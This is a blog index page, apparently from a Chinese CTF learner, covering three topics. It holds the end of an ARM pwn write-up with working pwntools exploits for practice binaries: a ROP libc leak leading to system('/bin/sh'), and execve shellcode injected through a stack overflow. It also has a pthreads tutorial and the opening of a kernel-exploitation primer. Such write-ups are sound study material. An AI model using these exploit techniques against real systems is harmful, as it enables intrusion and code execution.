IO.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;1&quot;</span>)</span><br><span class="line">    IO.sendlineafter(<span class="string">&quot; : &quot;</span>, <span class="built_in">str</span>(height))</span><br><span class="line">    IO.sendlineafter(<span class="string">&quot; : &quot;</span>, <span class="built_in">str</span>(weight))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">PT</span>(<span class="params">size</span>):</span><br><span class="line">    IO.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;3&quot;</span>)</span><br><span class="line">    IO.sendlineafter(<span class="string">&quot;?\n&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">write</span>(<span class="params">payload</span>):</span><br><span class="line">    IO.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;4&quot;</span>)</span><br><span class="line">    IO.send(payload)</span><br><span class="line"></span><br><span class="line">pop_r0_pc = <span class="number">0x00011bbc</span></span><br><span class="line"></span><br><span class="line">check(<span class="number">1.76</span>,<span class="number">103</span>)</span><br><span class="line">PT(-<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x54</span> + p32(pop_r0_pc) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line">pd += p32(<span class="number">0</span>)*<span class="number">7</span> + p32(elf.sym[<span class="string">&#x27;main&#x27;</span>])</span><br><span class="line">write(pd)</span><br><span class="line"></span><br><span class="line">IO.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line">IO.recvuntil(<span class="string">&quot;See you again :)\n&quot;</span>)</span><br><span class="line"></span><br><span class="line">libc.address = u32(IO.recvn(<span class="number">4</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(libc.address))</span><br><span class="line"></span><br><span class="line">check(<span class="number">1.82</span>, <span class="number">60</span>)</span><br><span class="line">PT(-<span class="number">1</span>)</span><br><span class="line">pd = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x54</span> + p32(pop_r0_pc) + p32(<span class="built_in">next</span>(libc.search(<span class="string">&quot;/bin/sh&quot;</span>))) + p32(libc.sym[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line">write(pd)</span><br><span class="line">IO.sendlineafter(<span class="string">&quot;:&quot;</span>, <span class="string">&quot;6&quot;</span>)</span><br><span class="line"></span><br><span class="line">IO.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h5 id="root-me-stack-buffer-overflow-basic"><a href="#root-me-stack-buffer-overflow-basic" class="headerlink" title="root_me_stack_buffer_overflow_basic"></a>root_me_stack_buffer_overflow_basic</h5><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context(os = <span class="string">&#x27;linux&#x27;</span>, arch = <span class="string">&#x27;arm&#x27;</span>, log_level = <span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">IO = process(<span class="string">&quot;qemu-arm -L /usr/arm-linux-gnueabihf ./root_me_stack_buffer_overflow_basic&quot;</span>, shell = <span class="literal">True</span>)</span><br><span class="line"><span class="comment">#IO = remote(&quot;node4.buuoj.cn&quot;, 26999)</span></span><br><span class="line"> </span><br><span class="line">IO.sendlineafter(<span class="string">b&quot;Give me data to dump:\n&quot;</span>, <span class="string">b&#x27;leak&#x27;</span>)</span><br><span class="line">shellcode_addr = <span class="built_in">int</span>(IO.recv(<span class="number">10</span>), <span class="number">16</span>)</span><br><span class="line">success(<span class="string">&quot;shellcode_addr:\t&quot;</span> + <span class="built_in">hex</span>(shellcode_addr))</span><br><span class="line"> </span><br><span class="line">IO.sendlineafter(<span class="string">b&quot;Dump again (y/n):\n&quot;</span>, <span class="string">b&#x27;y&#x27;</span>)</span><br><span class="line"> </span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    eor r1, r1</span></span><br><span class="line"><span class="string">    eor r2, r2</span></span><br><span class="line"><span class="string">    mov r7, #11</span></span><br><span class="line"><span class="string">    mov r0, pc</span></span><br><span class="line"><span class="string">    svc 0</span></span><br><span class="line"><span class="string">    .ascii &quot;/bin/sh\\0&quot;</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span>)</span><br><span class="line">payload = shellcode.ljust(<span class="number">0xa4</span>, <span class="string">b&#x27;\x00&#x27;</span>) + p32(shellcode_addr)</span><br><span class="line">IO.sendlineafter(<span class="string">b&quot;Give me data to dump:\n&quot;</span>, payload)</span><br><span class="line"> </span><br><span class="line">IO.sendlineafter(<span class="string">b&quot;Dump again (y/n):\n&quot;</span>, <span class="string">b&#x27;n&#x27;</span>)</span><br><span class="line">IO.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4><p><a target="_blank" rel="noopener" href="https://bbs.kanxue.com/thread-272332.htm">https://bbs.kanxue.com/thread-272332.htm</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/hencins/p/14084435.html">https://www.cnblogs.com/hencins/p/14084435.html</a></p>
<p><a target="_blank" rel="noopener" href="https://www.cjovi.icu/pwnreview/1353.html">https://www.cjovi.icu/pwnreview/1353.html</a></p>
<p><a target="_blank" rel="noopener" href="https://a1ex.online/2020/12/29/Arm%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/">https://a1ex.online/2020/12/29/Arm%E5%9F%BA%E7%A1%80%E5%AD%A6%E4%B9%A0/</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_41202237/article/details/118365722">https://blog.csdn.net/qq_41202237/article/details/118365722</a></p>
<p><a target="_blank" rel="noopener" href="https://changochen.github.io/2018-02-04-codegate.html">https://changochen.github.io/2018-02-04-codegate.html</a></p>
<p><a target="_blank" rel="noopener" href="https://x1ng.top/2020/11/16/arm-pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E8%B7%AF/">https://x1ng.top/2020/11/16/arm-pwn%E5%85%A5%E9%97%A8%E4%B9%8B%E8%B7%AF/</a></p>
<p><a target="_blank" rel="noopener" href="https://blingblingxuanxuan.github.io/2021/01/27/arm-pwn-start/">https://blingblingxuanxuan.github.io/2021/01/27/arm-pwn-start/</a></p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2023/06/19/arm/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/05/13/CC++%E5%A4%9A%E7%BA%BF%E7%A8%8B/">
        <h2 class="post-title">C/C++多线程</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/5/13
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h5 id="C"><a href="#C" class="headerlink" title="C"></a>C</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;pthread.h&gt;</span><br><span class="line"></span><br><span class="line">pthread_creat(thread,attr,start_routine,arg)//新线程可能在创建函数返回之前就运行了，甚至可能已经运行完毕了</span><br><span class="line"></span><br><span class="line">pthread_exit(status)//在主线程中调用，进程会等待所以线程结束以后才中止</span><br><span class="line"></span><br><span class="line">pthread_join(threadid,status)</span><br><span class="line"></span><br><span class="line">pthread_detach(threadid)</span><br></pre></td></tr></table></figure>

<h6 id="线程取消"><a href="#线程取消" class="headerlink" title="线程取消"></a>线程取消</h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">int pthread_cancel(pthread_t th)//允许一个线程取消另一个线程</span><br><span class="line"></span><br><span class="line">int pthread_setcancelstate(int state,int *oldstate)</span><br><span class="line"></span><br><span class="line">int pthread_setcanceltype(int type, int *oldtype)</span><br><span class="line">//取消会在取消点</span><br></pre></td></tr></table></figure>

<p>线程属性是一个数据结构，包括：</p>
<ol>
<li>作用域</li>
<li>栈大小</li>
<li>栈地址</li>
<li>优先级</li>
<li>分离状态</li>
<li>调度策略</li>
<li>调度参数</li>
</ol>
<p>关于属性</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">int pthread_attr_getdetachstate(const pthread_attr_r*,int *state*)</span><br><span class="line"></span><br><span class="line">int pthread_attr_setdetachstate(pthread_attr *attr, int state)</span><br></pre></td></tr></table></figure>
<p>pthread_join()子程序会阻碍调用程序,<strong>直到被合并</strong>，直到threadid线程终止位置。当创建一个线程，它的某个属性会定义它是否是可以连接的，如果线程创建时被定义为可分离的，则它就不能被连接(这个属性貌似是全局，不只是作用到某一个线程，只有删除属性才能取消作用)<br>pthread_detach()是将线程资源交由系统回收</p>
<p>线程的合并和分离都是用于<strong>回收线程资源</strong></p>
<p>关于优先级</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int pthread_attr_getschedparam(const pthread_attr_t *restrict attr,struct sched_param *restrict param)</span><br><span class="line"></span><br><span class="line">int pthread_attr_setschedparam(pthread_attr *restrict attr, const struct sched_param *restrict param)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>新线程是不继承父线程的调度优先级</p>
<p>关于调度</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">int pthread_attr_setschedpolicy(pthread_attr_t *attr,int policy)</span><br><span class="line">int pthread_attr_setschedpolicy(pthread_attr_t *attr,struct sched_param *param)</span><br></pre></td></tr></table></figure>
<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;pthread.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line"></span><br><span class="line">#define NUM_THREADS 5</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">void *wait(void *arg)</span><br><span class="line">&#123;</span><br><span class="line">	int i;</span><br><span class="line">	long tid;</span><br><span class="line"></span><br><span class="line">	tid = (long *)arg;</span><br><span class="line">	</span><br><span class="line">	sleep(1);</span><br><span class="line">	printf(&quot;sleeping in thread\n&quot;);</span><br><span class="line">	printf(&quot;thread with id : %d ....exiting\n&quot;,tid);</span><br><span class="line">	pthread_exit(NULL);</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	int rc;</span><br><span class="line">	int i;</span><br><span class="line">	pthread_t threads[NUM_THREADS];</span><br><span class="line">	pthread_attr_t attr;</span><br><span class="line">	void *status;</span><br><span class="line">	//init the thread as joinable</span><br><span class="line"></span><br><span class="line">	pthread_attr_init(&amp;attr);//全局作用开始</span><br><span class="line">	pthread_attr_setdetachstate(&amp;attr, PTHREAD_CREATE_JOINABLE);</span><br><span class="line">	</span><br><span class="line">	for(i = 0;i &lt; NUM_THREADS;i++)&#123;</span><br><span class="line">		printf(&quot;main() :creating thread..%d\n&quot;,i);</span><br><span class="line">	</span><br><span class="line">		rc = pthread_create(&amp;threads[i],NULL,wait,(void *)&amp;i);</span><br><span class="line">	</span><br><span class="line">		if(rc)&#123;</span><br><span class="line">			printf(&quot;error creating thread : %d\n&quot;,rc);</span><br><span class="line">			exit(-1);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line">	</span><br><span class="line">	//delete the attr,waiting for other threads</span><br><span class="line">	pthread_attr_destroy(&amp;attr);//全局作用结束，这期间的线程可连接，但话说回来，好像默认本来就可以的</span><br><span class="line">	</span><br><span class="line">	for(i = 0;i &lt; NUM_THREADS;i++)&#123;</span><br><span class="line">		rc = pthread_join(threads[i],&amp;status);</span><br><span class="line">		if(rc)&#123;</span><br><span class="line">			printf(&quot;error:unable to join %d\n&quot;,rc);</span><br><span class="line">			exit(-1);</span><br><span class="line">		&#125;</span><br><span class="line">	</span><br><span class="line">		printf(&quot;main(): completed thread id : %d &quot;,i);</span><br><span class="line">		printf(&quot;exiting with status : %d\n&quot;,status);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	printf(&quot;main :program exiting....\n&quot;);</span><br><span class="line">	pthread_exit(NULL);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="互斥"><a href="#互斥" class="headerlink" title="互斥"></a>互斥</h6><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_lock</span><span class="params">(pthread_mutex * mptr)</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_unlock</span><span class="params">(pthread_mutex * mptr*)</span></span><br><span class="line"><span class="comment">//both return 0 if OK</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_init</span><span class="params">(<span class="type">pthread_mutex_t</span> mutex,<span class="type">const</span> <span class="type">pthread_mutexattr_t</span> *attr)</span></span><br><span class="line"><span class="comment">//锁的初始化</span></span><br><span class="line">    </span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_destroy</span><span class="params">(<span class="type">pthread_mutex_t</span> * mutex)</span></span><br><span class="line"><span class="comment">//锁的销毁</span></span><br><span class="line">    </span><br><span class="line"><span class="type">int</span> <span class="title function_">pthread_mutex_trylock</span><span class="params">(<span class="type">pthread_mutex_t</span> *mutex)</span></span><br><span class="line"><span class="comment">//顾名思义try</span></span><br></pre></td></tr></table></figure>
<h6 id="同步"><a href="#同步" class="headerlink" title="同步"></a>同步</h6><p>使用条件变量可以<code>原子</code>(不可再分)方式阻塞线程</p>
<p>它的作用是避免无意义的占用锁资源(即获取了锁，但发现此时资源并不满足继续执行)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">int pthread_cond_wait(pthread_cond_t * cptr, pthread_mutex_t *mptr)</span><br><span class="line">//用于等待某个特定条件为真，通常只是唤醒等待某个特定变量的一个线程</span><br><span class="line"></span><br><span class="line">int pthread_cond_broadcast(pthread_cond *cptr)</span><br><span class="line">//唤醒等待某个特定变量的所有线程。</span><br><span class="line"></span><br><span class="line">int pthread_cond_signal(pthread_cond_t * cptr)</span><br><span class="line">//用于通知某个阻塞的线程特定条件为真了</span><br><span class="line"></span><br><span class="line">int pthread_cond_timedwait(pthread_cond_t * cptr,pthread_mutex_t *mptr,const struct timespec *abstime)</span><br><span class="line">//默认情况下，线程会一直阻塞，直到某个条件变量为真；如果想设置最大阻塞时间可以调用</span><br><span class="line">//如果时间到了，条件还没有为真，仍然返回，返回值为ETIME</span><br><span class="line"></span><br><span class="line">需要一个pthread_cond_t类型</span><br></pre></td></tr></table></figure>

<p>一般使用</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">int pthread_mutex_lock( pthread_mutex_t *mutex)</span><br><span class="line"></span><br><span class="line">int pthread_cond_wait(pthread_cond_t *cond,pthread_mutex_t *mutex)</span><br><span class="line">//这个函数自动包含一个加解锁动作，先解锁(因为此时已经获得了锁)查看是否满足条件，满足则继续执行，直到最后的解锁。若不满足则直接将锁交出去。</span><br><span class="line">int pthread_mutex_unlock(pthread_mutex_t *mutex)</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int pthread_mutex_signal(pthread_cond_t *cptr)//同理</span><br></pre></td></tr></table></figure>

<p>eg:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br></pre></td><td class="code"><pre><span class="line">/*</span><br><span class="line"> 是否熟悉POSIX多线程编程技术？如熟悉，编写程序完成如下功能：</span><br><span class="line">  1）有一int型全局变量g_Flag初始值为0；</span><br><span class="line">  2）在主线称中起动线程1，打印“this is thread1”，并将g_Flag设置为1</span><br><span class="line">  3）在主线称中启动线程2，打印“this is thread2”，并将g_Flag设置为2</span><br><span class="line">  4）线程序1需要在线程2退出后才能退出</span><br><span class="line">  5）主线程在检测到g_Flag从1变为2，或者从2变为1的时候退出</span><br><span class="line">   */</span><br><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;stdlib.h&gt;</span><br><span class="line">#include&lt;pthread.h&gt;</span><br><span class="line">#include&lt;errno.h&gt;</span><br><span class="line">#include&lt;unistd.h&gt;</span><br><span class="line"></span><br><span class="line">typedef void* (*fun)(void*);</span><br><span class="line"></span><br><span class="line">int g_Flag=0;</span><br><span class="line">static pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;</span><br><span class="line">static pthread_cond_t cond = PTHREAD_COND_INITIALIZER;</span><br><span class="line"></span><br><span class="line">void* thread1(void*);</span><br><span class="line">void* thread2(void*);</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> *  when program is started, a single thread is created, called the initial thread or main thread.</span><br><span class="line"> *  Additional threads are created by pthread_create.</span><br><span class="line"> *  So we just need to create two thread in main().</span><br><span class="line"> */</span><br><span class="line"></span><br><span class="line">int main(int argc, char** argv)</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;enter main\n&quot;);</span><br><span class="line">	pthread_t tid1, tid2;</span><br><span class="line">	int rc1=0, rc2=0;</span><br><span class="line">	rc2 = pthread_create(&amp;tid2, NULL, thread2, NULL);</span><br><span class="line">	if(rc2 != 0)</span><br><span class="line">		printf(&quot;%s: %d\n&quot;,__func__, strerror(rc2));</span><br><span class="line"></span><br><span class="line">	rc1 = pthread_create(&amp;tid1, NULL, thread1, &amp;tid2);</span><br><span class="line">	if(rc1 != 0)</span><br><span class="line">		printf(&quot;%s: %d\n&quot;,__func__, strerror(rc1));</span><br><span class="line"></span><br><span class="line">	pthread_cond_wait(&amp;cond, &amp;mutex);//main函数等待线程的cond信号，才能结束。</span><br><span class="line">	printf(&quot;leave main\n&quot;);</span><br><span class="line">	exit(0);	</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * thread1() will be execute by thread1, after pthread_create()</span><br><span class="line"> * it will set g_Flag = 1;</span><br><span class="line"> */</span><br><span class="line">void* thread1(void* arg)</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;enter thread1\n&quot;);</span><br><span class="line">	printf(&quot;this is thread1, g_Flag: %d, thread id is %u\n&quot;,g_Flag, (unsigned int)pthread_self());</span><br><span class="line">	pthread_mutex_lock(&amp;mutex);</span><br><span class="line">	if(g_Flag == 2)</span><br><span class="line">		pthread_cond_signal(&amp;cond);</span><br><span class="line">	g_Flag = 1;</span><br><span class="line">	printf(&quot;this is thread1, g_Flag: %d, thread id is %u\n&quot;,g_Flag, (unsigned int)pthread_self());</span><br><span class="line">	pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">	pthread_join(*(pthread_t*)arg, NULL);</span><br><span class="line">	printf(&quot;leave thread1\n&quot;);</span><br><span class="line">	pthread_exit(0);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">/*</span><br><span class="line"> * thread2() will be execute by thread2, after pthread_create()</span><br><span class="line"> * it will set g_Flag = 2;</span><br><span class="line"> */</span><br><span class="line">void* thread2(void* arg)</span><br><span class="line">&#123;</span><br><span class="line">	printf(&quot;enter thread2\n&quot;);</span><br><span class="line">	printf(&quot;this is thread2, g_Flag: %d, thread id is %u\n&quot;,g_Flag, (unsigned int)pthread_self());</span><br><span class="line">	pthread_mutex_lock(&amp;mutex);</span><br><span class="line">	if(g_Flag == 1)</span><br><span class="line">		pthread_cond_signal(&amp;cond);</span><br><span class="line">	g_Flag = 2;</span><br><span class="line">	printf(&quot;this is thread2, g_Flag: %d, thread id is %u\n&quot;,g_Flag, (unsigned int)pthread_self());</span><br><span class="line">	pthread_mutex_unlock(&amp;mutex);</span><br><span class="line">	printf(&quot;leave thread2\n&quot;);</span><br><span class="line">	pthread_exit(0);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h6 id="信号"><a href="#信号" class="headerlink" title="信号"></a>信号</h6><p>用于线程间通信</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">include&lt;semaphore.h&gt;</span><br><span class="line"></span><br><span class="line">int sem_init(sem *sem,int pshared, unsigned int value)</span><br><span class="line"></span><br><span class="line">int sem_wait(sem_t *sem)</span><br><span class="line">//如果信号量的值比0大，那么进行减一的操作，函数立即返回，如果当前信号量为0值，那么此调用会阻塞</span><br><span class="line">int sem_post(sem_t *sem)</span><br><span class="line">//增加信号量的值，如果有线程阻塞在这个信号量上，调用这个函数可以唤醒线程</span><br></pre></td></tr></table></figure>



























<h5 id="C-1"><a href="#C-1" class="headerlink" title="C++"></a>C++</h5><p>c++可以用C的线程库，但C11以后有了自己的标准线程库std::thread在头文件<thread>中</p>
<p>编译时要加参数-std&#x3D;c++11</p>

            
        </div>
    </div>
    <div class="post-tags">
        
        
        
    </div>
    <a href="/2023/05/13/CC++%E5%A4%9A%E7%BA%BF%E7%A8%8B/" class="go-post">阅读全文</a>
</div>

<div class="post">
    <a href="/2023/03/25/kernel/">
        <h2 class="post-title">kernel</h2>
    </a>
    <div class="category-and-date">
        
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/3/25
        </span>
        
        
    </div>
    <div class="description">
        <div class="content" v-pre>
            
            <h2 id="前置"><a href="#前置" class="headerlink" title="前置"></a>前置</h2><p>对于kernel，需要知道的</p>
<p>kernel起始也只是程序，只不过权限高一点而已，设计到一些的区别也不过权限区别</p>
<p>kernel运行在虚拟内存的内核区，而普通的用户程序运行在用户区，两各区域是相互隔开的，一般相互不交叉</p>
<h3 id="寄存器与指令"><a href="#寄存器与指令" class="headerlink" title="寄存器与指令"></a>寄存器与指令</h3><p><code>GS</code>寄存器</p>
<p>是程序在内核态与用户态之间转换时需要用到的寄存器，储存的是即将转换的地址(内核栈栈顶地址或者用户栈栈顶地址)</p>
<p>swapgs指令</p>
<p>就是汇编指令中用于切换的指令。</p>
<p>iret(interrupt return)也是汇编指令，它与int 0x80(interrupt)对应。</p>
<p>可以写一个简单的C函数保存信息</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// intel flavor assembly</span></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    __asm__(<span class="string">&quot;mov user_cs, cs;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_ss, ss;&quot;</span></span><br><span class="line">            <span class="string">&quot;mov user_sp, rsp;&quot;</span></span><br><span class="line">            <span class="string">&quot;pushf;&quot;</span></span><br><span class="line">            <span class="string">&quot;pop user_rflags;&quot;</span></span><br><span class="line">            );</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[*]status has been saved.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// at&amp;t flavor assembly</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">save_stats</span><span class="params">()</span> &#123;</span><br><span class="line"><span class="keyword">asm</span>(</span><br><span class="line">    <span class="string">&quot;movq %%cs, %0\n&quot;</span></span><br><span class="line">    <span class="string">&quot;movq %%ss, %1\n&quot;</span></span><br><span class="line">    <span class="string">&quot;movq 